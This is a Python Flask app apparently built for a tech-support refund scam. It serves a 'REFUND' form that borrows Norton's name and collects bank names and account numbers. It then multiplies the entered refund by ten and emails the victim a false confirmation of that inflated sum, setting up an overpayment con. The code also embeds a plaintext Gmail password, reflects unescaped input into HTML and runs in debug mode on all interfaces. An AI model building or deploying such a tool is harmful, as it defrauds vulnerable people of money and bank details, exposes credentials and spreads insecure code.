from flask import Flask, render_template, request
import smtplib

app = Flask(__name__)
html = '''
    <!DOCTYPE html>
<html>

<head>
  <style>
  *{
  margin: 0;
  padding: 0;
}
.container{
  width: 100%;
  height: 100vh;
  background-position: center;
  background-size: cover;
  background: blue;
}
.form-box{
  width: 90%;
  max-width: 450px;
  position: absolute;
  border-radius: 20px;
  top: 50%;
  transform: translate(-50%, -50%);
  left: 50%;
  background: #fff;
  color: #fff;
  padding: 50px, 60px, 70px;
  text-align:center;
  align-items: center;
}

.form-box h1{
  font-size: 30px;
  margin-bottom: 60px;
  top: 10px;
  color: #3c00a0;
  position: relative;
}

.form-box h1::after{
  content:'';
  width: 30px;
  height: 4px;
  border-radius: 3px;
  background: #3c00a0;
  position: absolute;
  bottom:-12px;
  left: 50%;
  transform: translateX(-50%);
}
.input-feild{
  background: #eaeaea;
  margin: 15px 45px;
  border-radius: 3px;
  width: 75%;
  display: flex;
  align-items: center;
}
input{
  width: 100%;
  align-items: center;
  background: transparent;
  border: 0;
  outline: 0;
  padding: 18px 15px;
}
.input-feild i{
  margin-left: 5px;
  color: #999;
}
form p{
  margin-left: 150px;
  font-size: 13px;
}
form p a{
  color: #3c00a0;
}
.btn{
  width: 100%;
  display: flex;
  justify-content: space-between;
}

.butn{
  flex-basis: 35%;
  background: #3c00a0;
  color: #fff;
  border-radius: 20px;
  width: 20px;
  height:40px;
  margin-top: 15px;
  cursor: pointer;
  border:0;
  outline:0;
  transition: background 1s;
 
}
.input-group{
  height: 440px;
}
.btn-space{
  width: 0px;
}
  </style>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
</head>
<script src="https://kit.fontawesome.com/8760be0b06.js" crossorigin="anonymous"></script>
<body>
<div class="container">
  <div class="form-box">
  <div>
    <h1>REFUND</h1>
  </div>
  <form method="POST" action="/submit">
    <div class="input-group">
    <div class="input-feild">
      <i class="fa-solid fa-user"></i>
        <input type="text" name="name" placeholder="Enter your name">
        </div>
        <div class="input-feild">
        <i class="fa-solid fa-envelope"></i>
        <input type="email" name="email" placeholder="Enter your email">
        </div>
        <div class="input-feild">
        <i class="fa-solid fa-building-columns"></i>
        <input type="text" name="bank" placeholder="Bank Name">
        </div>
        <div class="input-feild">
        <i class="fa-regular fa-credit-card"></i>
        <input type="number" name="account" placeholder="Account no">
        </div>
        <div class="input-feild">
        <i class="fa-solid fa-sack-dollar"></i>
        <input type="number" step="0.01" name="num" placeholder="Refund Amount" id="num">
        </div>
          <p><a href="https://community.norton.com/en/legal">Terms & Conditions</a></p>
          <div class="btn">
            <input class="btn-space" type="text" placeholder="">
          <button class="butn" type="reset" value="reset">Reset</button>
        <button class= "butn" type="submit" value="submit">Submit</button>
        <input class="btn-space" type="text" placeholder="">
        </div>
        </div>
    </form>
  
</div>
</div>
</body>

</html>
    '''
@app.route('/')
def form():
    return html

  
@app.route('/submit', methods=['POST'])
def submit():
    name = request.form.get('name')
    email = request.form.get('email')
    num = request.form.get('num')
    num = float(num)
    num = num*10
    num = str(num)
    bank = request.form.get('bank')
    account = request.form.get('account')
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("pythontesting526@gmail.com", "klckgjsbednedyuv")
    subject = "REFUND"
    msg = "Hello " + name + "\n\n$" + num + " has been successfully refunded to your " + bank + " Bank Account " + account + "\n\nSorry for any inconvinience that led to cancel your subscriptuon. Please come again for we are always available there for your tech problems.\n\nThank you."
    server.sendmail("pythontesting526@gmail.com", email, 'Subject: REFUND\n\n' + msg)
    server.quit()
    html_submit = """ 
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Submited</title>
  <link rel="stylesheet" href="submit.css">
</head>

<body>
<div class="conatiner">
  <div class="form-box">
  <p>
    {}
  </p>
  <p>
  ${} has been successfully refunded to your {} Bank Account {}.
  </p>
  <p>
    For more information check your mail <a>{}</a>
</p>
  </div>
</div>
</body>
</html>
  """.format(name, num, bank, account, email)

    return  html_submit
if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
